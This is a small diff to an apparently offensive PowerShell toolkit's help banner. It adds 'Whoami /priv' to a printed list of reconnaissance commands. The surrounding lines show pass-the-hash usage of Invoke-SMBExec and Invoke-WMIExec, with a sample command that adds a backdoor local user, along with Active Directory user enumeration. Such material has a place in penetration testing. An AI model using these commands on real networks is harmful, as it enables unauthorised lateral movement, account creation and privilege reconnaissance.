@@ -475,7 +475,7 @@ $header = '
         write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
         write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
-        write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
+        write-host " Net View | Net Users | Whoami /groups | Whoami /priv | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
         write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
         write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
